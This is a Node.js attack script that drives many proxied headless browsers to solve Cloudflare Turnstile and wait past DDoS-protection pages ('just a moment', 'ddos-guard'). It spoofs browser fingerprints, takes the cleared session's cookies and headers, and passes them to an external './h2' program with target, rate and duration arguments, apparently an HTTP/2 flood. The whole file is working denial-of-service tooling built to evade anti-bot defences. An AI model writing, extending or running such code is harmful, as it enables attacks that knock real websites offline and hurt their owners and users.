const { spawn, exec } = require('child_process')
const cluster = require('cluster')
const { EventEmitter } = require('events')
const WebSocket = require('ws')
const readline = require('readline')
const fs = require('fs')
const timers = require('timers/promises')

const SCRIPT = fs.readFileSync('script.js')

let [TARGET, TIME, RATE, PROXY, VERBOSE] = process.argv.slice(2)

let proxies = fs.readFileSync(PROXY, 'utf8').split('\n')

class CdpClient extends EventEmitter {
    constructor (url) {
        super()
        this.id = 1
        this.ws = new WebSocket(url)
        this.ids = {}

        this.ws.on('message', (msg) => {
            const data = JSON.parse(msg)
            
            if (!data.result && !data.error) {
                this.emit(data.method, data.params)
                return
            } else {
                /*if (!data.result)
                    console.log(data)*/
            }
    
            if (this.ids[data.id] != null) {
                if (data.error) {
                    this.ids[data.id].resolve(JSON.stringify(data.error))
                } else {
                    this.ids[data.id].resolve(data.result)
                }
            }
        })

        this.ws.on('open', () => {
            this.emit('open')
        })
    }

    async send(method, params, sessionId) {
        const myId = this.id++
        this.ws.send(JSON.stringify({
            id: myId,
            method,
            params,
            sessionId
        }))
        return await new Promise((resolve, reject) => {
            this.ids[myId] = { resolve, reject, params }
        })
    }
}

const executables = [
    'bins/117/cefsimple',
    'bins/116/cefsimple',
    'bins/115/cefsimple',
    'bins/114/cefsimple',
    'bins/113/cefsimple',
    'bins/112/cefsimple',
    'bins/111/cefsimple',
    'bins/110/cefsimple'
]

let procs = []
let stopped = false
let finished = false

function exit() {

    if (stopped)
        return

    stopped = true
    
    for (let p of procs) {
        p.kill('SIGINT')
    }
    process.exit(0)
}

process.on('uncaughtException', (e) => {
    console.error(e)
    //exit()
}).on('unhandledRejection', (e) => {
    console.error(e)
    //exit()
})

process.on('SIGTERM', () => {
    exit()
}).on('SIGINT', () => {
    exit()
})


if (cluster.isPrimary) {
    for (let i = 0; i < 128; i++) {
        /*const w = cluster.fork()
        w.on('message', msg => {
            exec(msg)
        })
        w.send(i)*/

        let usedProxies = {}

        let browser = () => new Promise((res0, rej0) => {

            let proxy = proxies[~~(Math.random() * (proxies.length))]
            while (usedProxies[proxy]) {
                if (Object.keys(usedProxies).length == proxies.length) {
                    finished = true
                    return
                }
                proxy = proxies[~~(Math.random() * (proxies.length))]
            }

            usedProxies[proxy] = 1

            const port = 60000 + i
            
            const s = spawn(executables[~~(Math.random() * executables.length)], [
                '--ignore-certificate-errors',
                `--remote-debugging-port=${port}`,
                '--no-zygote',
                '--no-sandbox',
                '--language=en_US',
                '--disable-gpu',
                `--proxy-server=${proxy}`,
                '--disable-background-networking',
                '--disable-software-rastrizier',
                '--disable-dev-shm',
                '--disable-blink-features=AutomationControlled',
                '--renderer-process-limit=1',
                '--num=1'
            ], {
                detached: false,
                stdio: 'pipe',
                env: Object.assign({
                    "LANG": "de"
                }, process.env)
            })
            procs.push(s)
            const rl = readline.createInterface(s.stderr)
            rl.on('line', data => {
                if (data.indexOf("ws://") != -1) {
                    const wsEndpoint = 'ws://' + data.split('ws://')[1].replace('\n', '')
                    const client = new CdpClient(wsEndpoint)
                    client.on('open', async () => {
        
                        async function turnstile(sessionId) {
                            setInterval(() => {
                                client.send('Runtime.evaluate', { expression: `JSON.stringify(document.querySelector(".ctp-checkbox-container map img, .ctp-checkbox-container input") == null ? {} : document.querySelector(".ctp-checkbox-container map img, .ctp-checkbox-container input").getBoundingClientRect().toJSON())` }, sessionId)
                                .then(rect => {
                                    if (rect.result) {
                                        return JSON.parse(rect.result.value)
                                    }
                                })
                                .then(async rect => {
                                    if (rect) {
                                        await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: rect.x + rect.width / 2, y: rect.y + rect.height / 2 }, sessionId)
                                        await client.send("Input.dispatchMouseEvent", { type: "mousePressed", button: "left",  x: rect.x + rect.width / 2, y: rect.y + rect.height / 2, clickCount: 1 }, sessionId)
                                        await client.send("Input.dispatchMouseEvent", { type: "mouseReleased", button: "left", x: rect.x + rect.width / 2, y: rect.y + rect.height / 2, clickCount: 1 }, sessionId)
                                    }
                                })
                            }, 7000).unref()
                            
                        }
        
                        let titleValue = ""
                        let ttt = []
        
                        function title(sessionId) {
                            setInterval(async () => {
                                let tt = (await client.send('Runtime.evaluate', { expression: `document.title` }, sessionId))
        
                                if (tt.result != null) {
                                    tt = tt.result.value
                                } else {
                                    tt = "errorrr"
                                }
        
                                if (tt != titleValue) {
                                    titleValue = tt
                                    console.log(i, { titleValue })
                                    try {
                                        ttt.push(titleValue)
                                    } catch (eeee) {
                                        console.log(eeee)
                                    }
                                }
                            }, 1000).unref()
                        }
        
                        const deviceMemories = [2,4,8]
        
                        const hardwareConcurrency = deviceMemories[~~(Math.random() * deviceMemories.length)]
                        const deviceMemory = deviceMemories[~~(Math.random() * deviceMemories.length)]
        
                        const expression = `(() => {
                            ${SCRIPT}; abc(${hardwareConcurrency}, ${deviceMemory}, ${Math.random()})
                        })()`
        
                        const targetsResponse = await client.send('Target.getTargets')
                        const pageTarget = targetsResponse.targetInfos.find(info => info.type === 'page');
        
                        const { sessionId } = await client.send('Target.attachToTarget', {
                            targetId: pageTarget.targetId,
                            flatten: true,
                        })
        
                        client.on('Target.targetCreated', async (data) => {
                            await client.send('Target.attachToTarget', {
                                targetId: data.targetInfo.targetId,
                                flatten: true,
                            })
                        })
        
                        client.on('Target.attachedToTarget', async (data) => {
                            client.send('Runtime.evaluate', { expression }, data.sessionId)
                            await client.send('Runtime.runIfWaitingForDebugger', {}, data.sessionId)
                            await client.send('Target.detachFromTarget', { sessionId: data.sessionId }, sessionId)
        
                            if (data.targetInfo.type == 'iframe') {
                                await turnstile(data.sessionId)
                            }
                        })
        
                        await client.send('Target.setDiscoverTargets', { discover: true }, sessionId)
                        await client.send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: true, flatten: true }, sessionId)
        
                        await client.send('Page.enable', {}, sessionId)
                        await client.send('Page.addScriptToEvaluateOnNewDocument', { source: expression }, sessionId)
        
                        let request = null
                        let mainFrame = null
                        let response = false
        
                        await new Promise(async (resolve) => {
        
                            let timer = null
        
                            const requestsIds = {}
        
                            client.on('Network.requestWillBeSent', (data) => {
        
                                requestsIds[data.requestId] = data
                                if (timer != null)
                                    clearTimeout(timer)
                                timer = setTimeout(resolve, 2000).unref()
                            })
                            client.on('Network.requestWillBeSentExtraInfo', (data) => {
                                if (!requestsIds[data.requestId]) {
                                    return
                                }
        
                                Object.assign(requestsIds[data.requestId], {
                                    extra: data
                                })
                                if (mainFrame.frameId == requestsIds[data.requestId].frameId && requestsIds[data.requestId].type == 'Document') {
                                    request = requestsIds[data.requestId].extra.headers
                                    timer = setTimeout(resolve, 2000).unref()
                                }
                            })
        
                            client.on('Network.responseReceived', (data) => {
                                if (data.frameId == mainFrame.frameId) {
                                    response = true
                                }
                                //if (timer != null)
                                    //clearTimeout(timer)
                                
                            })
        
                            /*await client.send('Network.setExtraHTTPHeaders', { headers: {
                                'sec-ch-ua-platform': "\"Windows\"",
                                //'user-agent': (await client.send('Runtime.evaluate', { expression: 'navigator.userAgent' }, sessionId)).result.value.replace('X11; Linux x86_64', 'Windows NT 10.0; Win64; x64')
                            } }, sessionId).then(console.log)*/
        
                            mainFrame = await client.send('Page.navigate', { url: "about:blank" }, sessionId)
                            await client.send('Network.enable', {}, sessionId)
                            await client.send('Page.navigate', { url: TARGET }, sessionId)
                            title(sessionId)
                        })
                        //await client.send('Runtime.evaluate', { expression: `location.href = location.href` }, sessionId)
        
                        let protections = [
                            'just a moment',
                            'один момент',
                            'ddos-guard',
                            'ddos guard',
                            'extern uam'
                        ]
        
                        await new Promise(async (r1) => {
                            while (ttt.length == 0 || protections.filter(a => ttt[ttt.length - 1].toLowerCase().indexOf(a) != -1).length > 0) {
                                await timers.setTimeout(100, null, { ref: false })
                            }
                            r1()
                        })
                        console.log(i, 'expr2', ttt, await client.send('Runtime.evaluate', { expression: `JSON.stringify([document.title, navigator.connection.rtt])` }, sessionId))
        
                        if (!request || !response) {
                            console.log('no')
                            s.kill('SIGINT')
                            s.kill('SIGTERM')
                            return
                        }
        
                        const url = new URL(TARGET)
        
                        await client.send('Network.emulateNetworkConditions', { offline: true, latency: -1, downloadThroughput: -1, uploadThroughput: -1 }, sessionId)
        
                        await client.send('Network.getCookies', { urls: [`${url.protocol}//${url.host}`] }, sessionId).then(cc => {
                            const headers = Object.entries(request).filter(x => !x[0].startsWith('content-') && !x[0].startsWith(":")).map(x => ['-h', `${x[0].toLowerCase()}@${x[1]}`])
        
                            function parseCookie(c) {
                                let result = [`${c.name}=${c.value}`, `path=${c.path}`]
                                if (c.expires > 0) {
                                    result.push(`expires=${new Date(c.expires * 1000).toUTCString()}`)
                                }
                                if (c.domain) {
                                    result.push(`domain=${c.domain}`)
                                }
                                if (c.httpOnly) {
                                    result.push('HttpOnly')
                                }
                                if (c.secure) {
                                    result.push('Secure')
                                }
                                if (c.sameSite) {
                                    result.push(`SameSite=${c.sameSite}`)
                                }
        
                                return result.join('; ')
                            }
        
                            const cookies = cc.cookies.map(x => ['-c', parseCookie(x)])
        
                            const args = [
                                '-k',
                                'nxver',
                                '-u',
                                TARGET,
                                '-n',
                                '1',
                                '-r',
                                RATE,
                                '-0',
                                proxy,
                                '-m',
                                '1',
                                '-s',
                                TIME,
                                '-b',
                                '-R'
                            ].concat(...headers).concat(...cookies)
        
                            //console.log({ proxy, args })
                            console.log(`./h2 ${args.map(x => `'${x}'`).join(' ')}`)
        
                            /*spawn("./h2nxver", args, {
                                stdio: "inherit",
                                detached: false,
                            });*/							
                                
                            //fs.appendFileSync(process.pid.toString() + "_session.sh", `./h2cf ${args.map(x => `'${x}'`).join(' ')}\n`)
                            exec(`./h2 ${args.map(x => `'${x}'`).join(' ')}`)
                        })
        
                        s.kill('SIGINT')
                        s.kill('SIGTERM')
                    })
                }
            })

            let t;

            s.on('close', () => {
                clearTimeout(t)
                res0()
            })

            t= setTimeout(() => {
                console.log('timed out')
                s.kill()
            }, 15000)
        })

        function x() {
            browser().catch(console.error).finally(() => {
                if (!stopped && !finished) {
                    x()
                }
            })
        }

        x()
    }
}
